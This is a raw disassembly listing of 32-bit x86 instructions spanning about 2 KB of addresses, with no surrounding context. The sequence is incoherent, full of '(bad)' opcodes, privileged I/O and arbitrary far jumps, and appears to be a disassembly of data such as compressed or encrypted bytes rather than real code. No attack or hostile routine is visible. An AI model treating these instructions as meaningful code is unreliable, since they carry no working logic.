  4200d8:	mov    bh,0xc9
  4200da:	pop    ss
  4200db:	adc    esi,DWORD PTR ds:[ecx-0x50340544]
  4200e2:	lock ss pop eax
  4200e5:	push   ebx
  4200e6:	sbb    al,0x22
  4200e8:	jmp    0x4200d3
  4200ea:	pop    esp
  4200eb:	stc    
  4200ec:	pusha  
  4200ed:	inc    ecx
  4200ee:	jge    0x42012f
  4200f0:	dec    eax
  4200f1:	jo     0x420100
  4200f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4200f4:	xchg   ebp,eax
  4200f5:	mov    ch,0x50
  4200f7:	mov    edx,0xfaf05487
  4200fc:	push   esi
  4200fd:	pop    eax
  4200fe:	cmc    
  4200ff:	(bad)  
  420101:	loop   0x42017e
  420103:	jmp    0xa3:0xe0ae18f2
  42010a:	outs   dx,BYTE PTR ds:[esi]
  42010b:	ja     0x4200a3
  42010d:	fdivr  DWORD PTR [eax-0x9395f9f]
  420113:	cmp    eax,0x76f326db
  420118:	or     eax,0x4300c8
  42011d:	(bad)  
  42011e:	cmp    BYTE PTR [edx],cl
  420120:	imul   edx,DWORD PTR [esi-0x2e],0x2a
  420124:	hlt    
  420125:	pusha  
  420126:	add    al,0xc4
  420128:	stos   BYTE PTR es:[edi],al
  420129:	dec    ecx
  42012a:	mov    dl,0xdc
  42012c:	mov    cl,BYTE PTR [eax]
  42012e:	into   
  42012f:	(bad)  
  420130:	retf   
  420131:	test   BYTE PTR [ecx-0x54],0xc4
  420135:	pop    esi
  420136:	out    dx,eax
  420137:	inc    esp
  420138:	or     ch,bl
  42013a:	jl     0x420137
  42013c:	add    ebp,DWORD PTR [edx+0x3bb03291]
  420142:	sti    
  420143:	ret    
  420144:	fnsave [ebp-0x20]
  420147:	mov    ds:0xb06c743f,al
  42014c:	adc    ch,BYTE PTR [edx-0x11c0c070]
  420152:	out    0xf5,al
  420154:	jno    0x420127
  420156:	add    eax,0xe5d79f0c
  42015b:	inc    esi
  42015c:	or     DWORD PTR [ebp-0x2e],ebx
  42015f:	stos   DWORD PTR es:[edi],eax
  420160:	loop   0x420137
  420162:	(bad)  
  420163:	loope  0x420132
  420165:	fstp   DWORD PTR [ebx+0x73eccd9]
  42016b:	inc    eax
  42016c:	pop    ebx
  42016d:	jge    0x42016c
  42016f:	pop    ss
  420170:	inc    ecx
  420171:	sub    eax,0xcdad1412
  420176:	adc    eax,0xa69e2d82
  42017b:	sub    eax,0xa07f7018
  420180:	js     0x420155
  420182:	jmp    0x42012a
  420184:	call   0xaee7:0x6779d055
  42018b:	mov    WORD PTR [ebx+0x35641698],?
  420191:	jbe    0x4201a0
  420193:	test   al,0xf
  420195:	es jbe 0x420128
  420198:	imul   ebx,ebp,0xdef25217
  42019e:	sub    ah,BYTE PTR [esi-0x2]
  4201a1:	fwait
  4201a2:	and    al,0x78
  4201a4:	jb     0x420216
  4201a6:	je     0x42020a
  4201a8:	retf   0x9c73
  4201ab:	cwde   
  4201ac:	shr    DWORD PTR [ecx],1
  4201ae:	ins    DWORD PTR es:[edi],dx
  4201af:	cmp    BYTE PTR [esp+esi*2-0x45],dl
  4201b3:	lods   eax,DWORD PTR ds:[esi]
  4201b4:	mov    bh,0xd4
  4201b6:	gs push ebx
  4201b8:	cwde   
  4201b9:	cmc    
  4201ba:	shl    BYTE PTR [eax-0x15e316c5],cl
  4201c0:	push   cs
  4201c1:	and    al,bl
  4201c3:	sub    al,0x8b
  4201c5:	add    al,bh
  4201c7:	(bad)
  4201cb:	push   ecx
  4201cc:	dec    eax
  4201cd:	imul   ebx,DWORD PTR [ecx+0x6715b400],0xa
  4201d4:	mov    esi,0x7f2fceac
  4201d9:	ins    BYTE PTR es:[edi],dx
  4201da:	cli    
  4201db:	mov    cl,0x50
  4201dd:	jmp    DWORD PTR [esi+esi*8+0x7e6f185a]
  4201e4:	or     al,0x55
  4201e6:	dec    edi
  4201e7:	aas    
  4201e8:	dec    ebx
  4201e9:	jg     0x4201fc
  4201eb:	stos   BYTE PTR es:[edi],al
  4201ec:	adc    ecx,DWORD PTR [edi-0x4b]
  4201ef:	sbb    BYTE PTR [ecx],dh
  4201f1:	arpl   WORD PTR [ebx+0x147bc7e9],dx
  4201f7:	ja     0x420272
  4201f9:	out    dx,al
  4201fa:	rcl    BYTE PTR [ebp-0x4a68f779],cl
  420200:	mov    cs,WORD PTR [ecx]
  420202:	sbb    BYTE PTR [ebx+esi*2],al
  420205:	call   0xb52:0x4961aa
  42020c:	mov    esp,0x7bec9f8a
  420211:	js     0x420238
  420213:	inc    ebx
  420214:	or     ebp,esi
  420216:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420217:	add    al,0xd9
  420219:	adc    bl,dh
  42021b:	xlat   BYTE PTR ds:[ebx]
  42021c:	(bad)
  42021f:	jns    0x420225
  420221:	fidiv  WORD PTR [eax-0x1db54b36]
  420227:	xchg   edx,eax
  420228:	sbb    ch,al
  42022a:	push   edi
  42022b:	das    
  42022c:	mov    ebx,0x73342f9d
  420231:	daa    
  420232:	in     eax,0x42
  420234:	mov    dh,0x9d
  420236:	jae    0x4202a3
  420238:	mov    ah,0xbc
  42023a:	fcom   DWORD PTR [ebp-0x2b]
  42023d:	ins    BYTE PTR es:[edi],dx
  42023e:	xchg   DWORD PTR [edi+edx*4-0x70],eax
  420242:	cld    
  420243:	xor    ebx,DWORD PTR [eax]
  420245:	(bad)  
  420247:	popf   
  420248:	xor    al,0xc0
  42024a:	add    dh,BYTE PTR [edi-0x80]
  42024d:	adc    edx,DWORD PTR [ecx+0x29]
  420250:	hlt    
  420251:	adc    BYTE PTR [eax-0x4a],bl
  420254:	inc    esp
  420255:	jl     0x4202a3
  420257:	test   BYTE PTR [ebx+0x799ac6b9],dh
  42025d:	mov    eax,0x9c5eb6a8
  420262:	sub    BYTE PTR [edi+0x1a],bl
  420265:	jge    0x42026d
  420267:	push   eax
  420268:	retf   
  420269:	mov    BYTE PTR [edi-0x3e6c4ef],cl
  42026f:	ret    0xfffc
  420272:	inc    eax
  420273:	js     0x42023b
  420275:	cld    
  420276:	loop   0x4202ad
  420278:	sub    eax,0x7f930a0f
  42027d:	add    esi,DWORD PTR [ebx-0x2c]
  420280:	out    0xdf,al
  420282:	retf   0x43f1
  420285:	(bad)  
  420287:	jb     0x420263
  420289:	repnz into 
  42028b:	(bad)  
  42028d:	outs   dx,BYTE PTR ds:[esi]
  42028e:	sbb    ch,BYTE PTR [edx-0x108464ec]
  420294:	aam    0x96
  420296:	add    esi,0xd7ff0d3d
  42029c:	and    cl,bh
  42029e:	xchg   esp,eax
  42029f:	mov    ebx,0x63116f45
  4202a4:	jb     0x4202f6
  4202a6:	push   ss
  4202a7:	mov    bh,0xa7
  4202a9:	pop    esp
  4202aa:	pop    eax
  4202ab:	inc    ebx
  4202ac:	shr    DWORD PTR ds:0xbe891ef3,cl
  4202b2:	xchg   edi,eax
  4202b3:	mov    ah,0x7b
  4202b5:	popa   
  4202b6:	cmp    ch,BYTE PTR [esi-0x61808e1a]
  4202bc:	imul   ecx,DWORD PTR [edi+0x3f],0x7fbaf95d
  4202c3:	xor    al,dh
  4202c5:	jg     0x4202a0
  4202c7:	inc    edi
  4202c8:	push   esp
  4202c9:	push   ss
  4202ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202cb:	mov    eax,ds:0xd23c9967
  4202d0:	fcom   QWORD PTR [ebp+edx*2+0x7d]
  4202d4:	repnz dec eax
  4202d6:	mov    ebx,0xa1588c10
  4202db:	cli    
  4202dc:	jle    0x4202de
  4202de:	adc    cl,BYTE PTR [ebx-0x59]
  4202e1:	pop    ebx
  4202e2:	pop    eax
  4202e3:	inc    edi
  4202e4:	cdq    
  4202e5:	shl    DWORD PTR [ebp+0x2a],cl
  4202e8:	rol    ecx,1
  4202ea:	mov    ds:0x5c447931,eax
  4202ef:	and    DWORD PTR [esi+0x64f0ed89],0xfda7a183
  4202f9:	cdq    
  4202fa:	test   eax,0x7f61a2
  4202ff:	add    cl,dh
  420301:	inc    edi
  420302:	xor    esi,DWORD PTR [eax]
  420304:	cs push ecx
  420306:	cs mov cl,0xe9
  420309:	sbb    eax,0xf1d6b2e5
  42030e:	dec    esp
  42030f:	and    edi,edx
  420311:	cmc    
  420312:	or     DWORD PTR [esi-0x22f53d4b],edi
  420318:	sub    al,0x85
  42031a:	cmp    bl,0xa5
  42031d:	xchg   esi,eax
  42031e:	dec    eax
  42031f:	outs   dx,DWORD PTR ds:[esi]
  420320:	test   al,0x8b
  420322:	addr16 pusha 
  420324:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420325:	xlat   BYTE PTR ds:[ebx]
  420326:	add    dh,BYTE PTR [edx]
  420328:	pop    ebp
  420329:	xchg   esi,eax
  42032a:	hlt    
  42032b:	cmp    DWORD PTR [esi-0x44],esp
  42032e:	mov    cl,0xbd
  420330:	iret   
  420331:	or     DWORD PTR [esi+0x25359edf],ecx
  420337:	enter  0x8a2d,0x6f
  42033b:	fldcw  WORD PTR [edi+0x37]
  42033e:	inc    esp
  42033f:	rcr    bl,0xf1
  420342:	std    
  420343:	ins    DWORD PTR es:[edi],dx
  420344:	jmp    0x2325:0x84947fa2
  42034b:	xchg   esi,eax
  42034c:	xchg   esp,eax
  42034d:	(bad)  [ebx-0x5c560ac0]
  420353:	mov    esi,0xe7683fd
  420358:	or     eax,0x24fdb175
  42035d:	icebp  
  42035e:	dec    ebp
  42035f:	cld    
  420360:	mov    ebx,0xb8169158
  420365:	xchg   edi,eax
  420366:	call   0x217ca1c5
  42036b:	(bad)  
  42036c:	xor    DWORD PTR [ecx-0x55],edx
  42036f:	fld    DWORD PTR [edi]
  420371:	loop   0x420391
  420373:	add    al,0x99
  420375:	sbb    al,BYTE PTR [ebp-0x46]
  420378:	push   ecx
  420379:	xchg   ecx,eax
  42037a:	mov    ecx,0xeba2e109
  42037f:	mov    dh,0xf6
  420381:	sbb    eax,0x37831bd
  420386:	les    ebp,FWORD PTR [esi]
  420388:	or     edx,ecx
  42038a:	push   ebp
  42038b:	add    dl,BYTE PTR ds:0x1fd17a98
  420391:	je     0x420411
  420393:	mov    esp,0x55b1d7fe
  420398:	and    ch,BYTE PTR [ebx+0x6b]
  42039b:	pop    es
  42039c:	add    ebp,DWORD PTR [ebx-0x3ef96ed]
  4203a2:	add    eax,0x647aa742
  4203a7:	and    DWORD PTR [ebp+0x23fe5aa7],esp
  4203ad:	loope  0x420330
  4203af:	cmp    eax,0xd856cc5a
  4203b4:	dec    eax
  4203b5:	les    esp,FWORD PTR [ebp+0x12]
  4203b8:	pop    esp
  4203b9:	sbb    BYTE PTR [edx-0x5eb69c],ah
  4203bf:	push   eax
  4203c0:	and    dh,0x4c
  4203c3:	enter  0xcbed,0x6a
  4203c7:	xor    al,0x1f
  4203c9:	xchg   esp,eax
  4203ca:	imul   esi,DWORD PTR [eax+0x41d4550e],0xe2abf347
  4203d4:	add    eax,0xce8b7ebb
  4203d9:	push   esi
  4203da:	clc    
  4203db:	push   ebp
  4203dd:	push   DWORD PTR [ecx-0x35da8f5c]
  4203e3:	mov    edi,0x131063c2
  4203e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203e9:	xchg   ebp,eax
  4203ea:	cwde   
  4203eb:	or     eax,0xb4707db1
  4203f0:	xchg   ebx,eax
  4203f1:	test   DWORD PTR [edi-0xe],ebx
  4203f4:	xchg   esi,ecx
  4203f6:	sbb    BYTE PTR [esi-0x61],ah
  4203f9:	mov    DWORD PTR [esi],0x9f8dcd05
  4203ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420400:	outs   dx,DWORD PTR ds:[esi]
  420401:	jbe    0x42039f
  420403:	dec    ebx
  420404:	icebp  
  420405:	pop    eax
  420406:	fwait
  420407:	mov    dl,0x38
  420409:	inc    edi
  42040a:	inc    ecx
  42040b:	jne    0x42039b
  42040d:	xor    DWORD PTR [esi-0x5f],ebx
  420410:	rcl    DWORD PTR [esi+esi*8-0x745eb99f],0x7f
  420418:	push   0xfa017740
  42041d:	push   ebx
  42041e:	jmp    0x5560:0xd6a0a7a1
  420425:	mov    ch,0xa9
  420427:	mov    cl,0x5b
  420429:	jge    0x42040d
  42042b:	jg     0x42042e
  42042d:	adc    esp,edi
  42042f:	mov    bl,0x5e
  420431:	es push ds
  420433:	je     0x42041b
  420435:	jb     0x4203e7
  420437:	mov    ebx,0x48dd2a85
  42043c:	stc    
  42043d:	and    al,BYTE PTR [edi-0x78a570cc]
  420443:	xor    eax,0xed5c9a87
  420448:	cmp    al,0x2
  42044a:	lahf   
  42044b:	imul   esi,edx,0x56
  42044e:	iret   
  42044f:	mov    ecx,0x354143ef
  420454:	in     eax,dx
  420455:	push   ebx
  420456:	dec    eax
  420457:	jo     0x42043e
  420459:	push   edi
  42045a:	jbe    0x420476
  42045c:	fwait
  42045d:	shl    BYTE PTR [ebx-0x6b],0xd0
  420461:	in     eax,0xe9
  420463:	inc    edi
  420464:	ss retf 0x1b43
  420468:	or     DWORD PTR [ebx+esi*4],ebp
  42046b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42046c:	stos   DWORD PTR es:[edi],eax
  42046d:	xlat   BYTE PTR ds:[ebx]
  42046e:	inc    esi
  42046f:	in     al,0xa
  420471:	cmp    bl,BYTE PTR [ebx-0x52]
  420474:	cmp    eax,0xfe5dd071
  420479:	pop    ds
  42047a:	or     BYTE PTR [edi+0x684f08ad],ch
  420480:	add    ch,BYTE PTR [ebp+0x4ff8b28c]
  420486:	or     BYTE PTR [edi+0x9],cl
  420489:	xor    edi,DWORD PTR ds:0x5502
  42048e:	jns    0x42049e
  420490:	xchg   edi,eax
  420491:	mov    esp,0x868175af
  420496:	popa   
  420497:	xchg   ebp,eax
  420498:	sbb    BYTE PTR [eax],dh
  42049a:	sub    eax,esi
  42049c:	pop    ebx
  42049d:	sbb    BYTE PTR [eax+0x6cd7551a],bh
  4204a3:	mov    ds:0xfa484991,eax
  4204a8:	adc    DWORD PTR [ecx],eax
  4204aa:	add    DWORD PTR [esi],0xffffffa3
  4204ad:	jns    0x420497
  4204af:	dec    edx
  4204b0:	retf   
  4204b1:	pusha  
  4204b2:	cmp    BYTE PTR [edx-0x2e72bd16],ah
  4204b8:	pop    eax
  4204b9:	sbb    DWORD PTR [esi-0x3868cb53],edx
  4204bf:	std    
  4204c0:	xchg   BYTE PTR [esi+esi*4-0x6],al
  4204c4:	fbstp  TBYTE PTR [edi-0x68]
  4204c7:	fwait
  4204c8:	ret    
  4204c9:	(bad)  
  4204ca:	out    dx,eax
  4204cb:	xchg   esp,eax
  4204cc:	jb     0x420542
  4204ce:	call   0x13513341
  4204d3:	fnstsw WORD PTR [ebp+0x18]
  4204d6:	shl    DWORD PTR [eax-0x37cdd48d],1
  4204dc:	les    edi,FWORD PTR [ecx+ecx*2]
  4204df:	mov    gs,WORD PTR [esi+0x69]
  4204e2:	jge    0x4204bf
  4204e4:	pop    esi
  4204e5:	mov    eax,0x5a929ee4
  4204ea:	in     eax,0x54
  4204ec:	jb     0x420547
  4204ee:	jnp    0x4204cb
  4204f0:	cs ss dec esp
  4204f3:	add    BYTE PTR [edi-0x4c74e47e],ch
  4204f9:	mov    bl,0x80
  4204fb:	jns    0x4204cc
  4204fd:	(bad)  [ebp-0x14e21c8e]
  420503:	ins    DWORD PTR es:[edi],dx
  420504:	stos   DWORD PTR es:[edi],eax
  420505:	mov    bl,0x4b
  420507:	into   
  420508:	pushf  
  420509:	fwait
  42050a:	add    al,0x4e
  42050c:	dec    esp
  42050d:	ds xchg edx,eax
  42050f:	daa    
  420510:	stos   BYTE PTR es:[edi],al
  420511:	ja     0x420562
  420513:	adc    al,0xaa
  420515:	ja     0x4204d5
  420517:	mov    al,ds:0x8d6dd9fd
  42051c:	mov    edi,0x7ed62054
  420521:	push   esi
  420522:	fiadd  WORD PTR [ecx-0x17da153a]
  420528:	loopne 0x42059e
  42052a:	mov    es,WORD PTR [esp+edi*8]
  42052d:	lods   al,BYTE PTR ds:[esi]
  42052e:	adc    BYTE PTR [ebx+ebp*1+0x4207c403],0x27
  420536:	out    0xd2,al
  420538:	push   ebx
  420539:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42053a:	adc    eax,0xd87ed3c7
  42053f:	jb     0x42057c
  420541:	mov    eax,0x545c69bf
  420546:	dec    ebx
  420547:	pop    ss
  420548:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420549:	not    BYTE PTR [ebx+0x6]
  42054c:	add    DWORD PTR ds:0xeb88a557,esi
  420552:	stos   DWORD PTR es:[edi],eax
  420553:	lock fwait
  420555:	jge    0x42057e
  420557:	adc    BYTE PTR [ebp+0x7b1ddbc6],ch
  42055d:	mov    ?,WORD PTR [ebp-0x78]
  420560:	lods   eax,DWORD PTR ds:[esi]
  420561:	fild   WORD PTR [edx]
  420563:	sbb    DWORD PTR [ebx],esp
  420565:	test   eax,0x8a76e53b
  42056a:	jp     0x420560
  42056c:	popa   
  42056d:	jg     0x420532
  42056f:	pop    es
  420570:	pop    ss
  420571:	imul   edx,DWORD PTR [edi+ebp*8],0x32470892
  420578:	outs   dx,DWORD PTR ds:[esi]
  420579:	mov    BYTE PTR [eax+0xf],dl
  42057c:	inc    ebp
  42057d:	or     eax,esi
  42057f:	xlat   BYTE PTR ds:[ebx]
  420580:	adc    al,0x73
  420582:	dec    eax
  420583:	mov    ah,ah
  420585:	or     BYTE PTR [edi],ch
  420587:	sbb    ch,BYTE PTR [eax+edi*4+0x5b]
  42058b:	adc    cl,BYTE PTR [ebp+ebp*4+0x7fe24505]
  420592:	or     eax,0x3ebd2a17
  420597:	jnp    0x4205d8
  420599:	inc    edx
  42059a:	and    ecx,DWORD PTR [edi+0x30260853]
  4205a0:	outs   dx,DWORD PTR ds:[esi]
  4205a1:	mov    gs,WORD PTR [ebx+edi*1+0x4d2d35c]
  4205a8:	scas   eax,DWORD PTR es:[edi]
  4205a9:	fs out dx,eax
  4205ab:	mov    ebx,0x4c85121a
  4205b0:	stos   BYTE PTR es:[edi],al
  4205b1:	xchg   esp,eax
  4205b2:	dec    esp
  4205b3:	stos   DWORD PTR es:[edi],eax
  4205b4:	adc    eax,0x2f8a0622
  4205b9:	mov    ah,0x18
  4205bb:	cs std 
  4205bd:	sbb    eax,0xc4ec9858
  4205c2:	sub    bl,BYTE PTR [edx+ecx*2+0x72f1dca7]
  4205c9:	xchg   edi,eax
  4205ca:	bound  ebx,QWORD PTR [ebx+0x21]
  4205cd:	push   ecx
  4205ce:	pop    ebp
  4205cf:	add    DWORD PTR [ebx],edi
  4205d1:	(bad)  
  4205d2:	dec    eax
  4205d3:	jmp    0x7e30:0xb63d808b
  4205da:	int    0x84
  4205dc:	test   DWORD PTR [ecx-0x6f050f6c],esp
  4205e2:	enter  0x443e,0x70
  4205e6:	sar    BYTE PTR [esi-0x7a487c1a],cl
  4205ec:	pop    ss
  4205ed:	ins    BYTE PTR es:[edi],dx
  4205ee:	xchg   ebx,eax
  4205ef:	lods   al,BYTE PTR ds:[esi]
  4205f0:	mov    eax,0xc9adb4d3
  4205f5:	jge    0x4205a4
  4205f7:	or     dl,al
  4205f9:	add    BYTE PTR [ebx],ah
  4205fb:	ins    BYTE PTR es:[edi],dx
  4205fc:	mov    ss,WORD PTR ds:0x2dad89f7
  420602:	cmp    al,0x2
  420604:	retf   
  420605:	loope  0x42065c
  420607:	(bad)  
  420608:	lock and bh,0xa9
  42060c:	inc    edi
  42060d:	jmp    0x802edf71
  420612:	popf   
  420613:	jmp    0xc4c8f0d6
  420618:	jmp    0x42067f
  42061a:	dec    edx
  42061b:	pop    ebp
  42061c:	push   ecx
  42061d:	popa   
  42061e:	popa   
  42061f:	cmp    bl,BYTE PTR [eax]
  420621:	push   es
  420622:	fist   WORD PTR [ebp+0x45]
  420625:	mov    esp,0x39bfd54b
  42062a:	aas    
  42062b:	ret    0x1f85
  42062e:	jns    0x420629
  420630:	out    0x62,eax
  420632:	and    al,0x91
  420634:	in     eax,dx
  420635:	test   eax,0xae087ce7
  42063b:	and    eax,0x128a1ec8
  420640:	mov    bh,0x78
  420642:	enter  0xa6b4,0x75
  420646:	lahf   
  420647:	sub    al,BYTE PTR [edx+0xd]
  42064a:	cwde   
  42064b:	inc    ebp
  42064c:	dec    edx
  42064d:	mov    bh,0xc8
  42064f:	shr    DWORD PTR [eax],0xc8
  420652:	repnz in eax,0xfb
  420655:	cmp    BYTE PTR [eax-0x379e8182],al
  42065b:	adc    BYTE PTR [ecx+0x59],al
  42065e:	jmp    0x4206b7
  420660:	jmp    FWORD PTR [esi-0x619304d1]
  420666:	jno    0x42064e
  420668:	xor    DWORD PTR [eax],0xe0bcb4e7
  42066e:	pop    ecx
  42066f:	inc    edx
  420670:	pop    ecx
  420671:	cmp    bl,dl
  420673:	adc    al,0x66
  420675:	addr16 jl 0x4206ed
  420678:	jne    0x42064f
  42067a:	out    0xf2,al
  42067c:	lds    eax,FWORD PTR [ebp-0x59e0c341]
  420682:	aaa    
  420683:	cmp    eax,DWORD PTR [eax+0x28]
  420686:	cli    
  420687:	push   0x2e
  420689:	in     eax,0xe9
  42068b:	das    
  42068c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42068d:	popf   
  42068e:	sub    eax,0xa4ec7649
  420693:	ins    DWORD PTR es:[edi],dx
  420694:	pop    es
  420695:	pusha  
  420696:	sub    al,0x93
  420698:	ins    BYTE PTR es:[edi],dx
  420699:	pop    edi
  42069a:	rcl    DWORD PTR [ebx-0x5],0xd0
  42069e:	rcr    BYTE PTR [eax-0x60947faa],1
  4206a4:	rcr    edi,cl
  4206a6:	pop    ebx
  4206a7:	push   0x64
  4206a9:	jecxz  0x420675
  4206ab:	add    ecx,ebp
  4206ad:	scas   al,BYTE PTR es:[edi]
  4206ae:	xchg   edi,eax
  4206af:	inc    esp
  4206b0:	or     ch,cl
  4206b2:	add    ebx,DWORD PTR [ebx+ecx*8+0x10]
  4206b6:	mov    ebx,0x182c7078
  4206bb:	mov    esp,0x4cadb9a0
  4206c0:	stc    
  4206c1:	aaa    
  4206c2:	jl     0x4206ea
  4206c4:	add    edx,ecx
  4206c6:	jnp    0x4206f5
  4206c8:	pop    ecx
  4206c9:	adc    dl,BYTE PTR [eax+0x26eb9694]
  4206cf:	fisttp QWORD PTR [edx+esi*1+0x51]
  4206d3:	cmp    eax,0x93928a2a
  4206d8:	or     ah,BYTE PTR [ebp-0x18ca53ec]
  4206de:	adc    ah,BYTE PTR [eax+0x118c4c1a]
  4206e4:	adc    ch,dl
  4206e6:	in     al,0x43
  4206e8:	std    
  4206e9:	addr16 out dx,eax
  4206eb:	mov    ecx,0xb6fb7308
  4206f0:	sbb    BYTE PTR [edx],0xae
  4206f3:	mov    bh,ah
  4206f5:	jge    0x4206d3
  4206f7:	es out dx,eax
  4206f9:	inc    eax
  4206fa:	test   eax,0x5dcd2e39
  4206ff:	xchg   esp,eax
  420700:	pop    esi
  420701:	xchg   ebx,eax
  420702:	push   ebp
  420703:	and    BYTE PTR [edi],bl
  420705:	mov    eax,0x4f09dca
  42070a:	xor    DWORD PTR [bp+si-0x6c],ecx
  42070e:	adc    edi,eax
  420710:	jge    0x4206e4
  420712:	mov    al,BYTE PTR [esi-0x617326a2]
  420718:	mov    BYTE PTR [edx-0x57],bl
  42071b:	mov    bh,0x4b
  42071d:	sbb    al,0xf3
  42071f:	mov    ch,0x1a
  420721:	imul   edi,DWORD PTR [ebp-0x37],0x72
  420725:	jge    0x420796
  420727:	mov    ds:0xfc987560,eax
  42072c:	mov    esi,ecx
  42072e:	addr16 pop ss
  420730:	or     DWORD PTR [edx],0xfffffffc
  420733:	sbb    eax,0x595e24f9
  420738:	xor    dh,BYTE PTR [edi+ecx*4+0x49033a19]
  42073f:	and    ch,BYTE PTR [edx+0x3f2a848f]
  420745:	aam    0x27
  420747:	dec    ebp
  420748:	gs dec ebx
  42074a:	xor    cl,BYTE PTR [ebx-0x440b701d]
  420750:	jns    0x4206d8
  420752:	stos   BYTE PTR es:[edi],al
  420753:	scas   eax,DWORD PTR es:[edi]
  420754:	adc    bh,BYTE PTR [edi+0x2da0ca65]
  42075a:	inc    eax
  42075b:	int3   
  42075c:	sbb    eax,edi
  42075e:	popf   
  42075f:	xchg   DWORD PTR [eax],esi
  420761:	cmc    
  420762:	scas   eax,DWORD PTR es:[edi]
  420763:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420764:	push   edx
  420765:	fidivr DWORD PTR [edx]
  420767:	retf   0xdcb4
  42076a:	dec    ecx
  42076b:	hlt    
  42076c:	popf   
  42076d:	rcr    BYTE PTR [esi],0xac
  420770:	shl    BYTE PTR [edx-0x1e],cl
  420773:	out    0xa0,eax
  420775:	data16 mov ds:0xe0f3edc8,al
  42077b:	(bad)  
  42077c:	scas   al,BYTE PTR es:[edi]
  42077d:	shr    DWORD PTR [eax-0x1d301be1],1
  420783:	lods   al,BYTE PTR ds:[esi]
  420784:	push   es
  420785:	xor    ebx,DWORD PTR [esi-0x58]
  420788:	jb     0x4207e9
  42078a:	jns    0x4207e3
  42078c:	imul   ecx,DWORD PTR [ecx-0x3e],0x39
  420790:	sahf   
  420791:	cmp    al,0x76
  420793:	scas   al,BYTE PTR es:[edi]
  420794:	loop   0x420807
  420796:	jmp    DWORD PTR [eax]
  420798:	sub    BYTE PTR [edx+0x67abdb09],dh
  42079e:	dec    esp
  42079f:	push   es
  4207a0:	sub    bh,cl
  4207a2:	xor    DWORD PTR [ecx+ecx*1+0x0],esp
  4207a6:	push   ss
  4207a7:	out    0xcc,al
  4207a9:	jbe    0x42077d
  4207ab:	mov    esi,0x2ac2b1d5
  4207b0:	xchg   edx,eax
  4207b1:	pop    ebp
  4207b2:	mov    WORD PTR [esi-0x5],?
  4207b5:	retf   0xda77
  4207b8:	popa   
  4207b9:	push   edx
  4207ba:	(bad)  
  4207bb:	int3   
  4207bc:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207be:	in     al,0xf
  4207c0:	or     al,0xd
  4207c2:	imul   eax,DWORD PTR [eax],0xffffffd0
  4207c5:	mov    cl,0x9f
  4207c7:	inc    ebx
  4207c8:	fisubr DWORD PTR [ebp+ebx*8-0x3f8c143b]
  4207cf:	or     BYTE PTR [ebp-0x41ccfd1c],0x67
  4207d6:	mov    esi,edx
  4207d8:	jecxz  0x4207c1
  4207da:	xor    al,0xd
  4207dc:	ins    BYTE PTR es:[edi],dx
  4207dd:	mov    bl,0xd8
  4207df:	pushf  
  4207e0:	cwde   
  4207e1:	imul   esp,DWORD PTR [ebp+0x2f399926],0xed1997ab
  4207eb:	in     al,dx
  4207ec:	dec    esi
  4207ed:	mov    ch,0x60
  4207ef:	mov    ah,0x65
  4207f1:	rcr    DWORD PTR [ecx+0x30b35a44],0x56
  4207f8:	lahf   
  4207f9:	xor    BYTE PTR ds:0xef3bbfdc,al
  4207ff:	test   eax,0x517a3d08
  420804:	or     BYTE PTR [eax+0x77],dh
  420807:	cmp    BYTE PTR [ecx+esi*4],cl
  42080a:	add    eax,DWORD PTR fs:[edx-0x55]
  42080e:	add    edi,ebp
  420810:	mov    ecx,0x1575ce0e
  420815:	add    esp,ebx
  420817:	sbb    al,0x9c
  420819:	xchg   edi,eax
  42081a:	cmc    
  42081b:	add    al,0xf3
  42081d:	pusha  
  42081e:	cmp    DWORD PTR [ebx+0x30],ecx
  420821:	or     al,0xce
  420823:	call   0x25903e21
  420828:	mov    ebp,0xa4410d6
  42082d:	push   0xffffffc0
  42082f:	popa   
  420830:	mov    esp,0xdd4fbb2c
  420835:	xor    cl,BYTE PTR [ecx-0x4d0d7fe4]
  42083b:	js     0x42084c
  42083d:	adc    eax,0xa092c296
  420842:	push   ss
  420843:	dec    ecx
  420844:	xchg   ebx,eax
  420845:	dec    ecx
  420846:	inc    ebp
  420847:	pop    esi
  420848:	push   esp
  420849:	jns    0x420869
  42084b:	xchg   BYTE PTR [edx-0x2995689b],cl
  420851:	fdivr  QWORD PTR [edi]
  420853:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420854:	mov    eax,esi
  420856:	inc    esi
  420857:	sub    DWORD PTR [esi],0x1b
  42085a:	cmp    edi,DWORD PTR [edi]
  42085c:	add    eax,0xfbea1262
  420861:	pop    edx
  420862:	icebp  
  420863:	jo     0x420897
  420865:	aas    
  420866:	out    0xe,al
  420868:	add    BYTE PTR [eax],0x98
  42086b:	jecxz  0x4207fb
  42086d:	dec    ebp
  42086e:	ret    0x19a1
  420871:	ds stc 
  420873:	sub    edi,DWORD PTR [ecx+0x74]
  420876:	mov    dh,dh
  420878:	inc    eax
  420879:	data16 inc BYTE PTR [ecx*4+0x7a50fe7a]
  420881:	mov    ebp,DWORD PTR [ebx-0x2f679cca]
  420887:	call   0x979b60f5
  42088c:	dec    ebx
  42088d:	cwde   
  42088e:	stc    
  42088f:	cmp    eax,0x9ee87486
  420894:	add    edx,DWORD PTR [eax]
  420896:	cdq    
  420897:	sbb    ecx,DWORD PTR [ecx-0x12]
  42089a:	cmpxchg DWORD PTR [ebx+0x79],edi
  42089e:	mov    dh,0x9
  4208a0:	pop    edi
  4208a1:	cmp    eax,0x6f52a691
  4208a6:	(bad)  
  4208a8:	aam    0xdf
  4208aa:	sbb    BYTE PTR [edi+0x4e],0xbb
  4208ae:	arpl   WORD PTR [edi],bx
  4208b0:	add    DWORD PTR [esi-0x58],0x2d
  4208b4:	jnp    0x42090d
  4208b6:	adc    eax,0xe1203f4a
  4208bb:	in     eax,0x20
  4208bd:	pusha  
  4208be:	mov    al,ds:0xdd7d3a39
  4208c3:	mov    bh,0xe
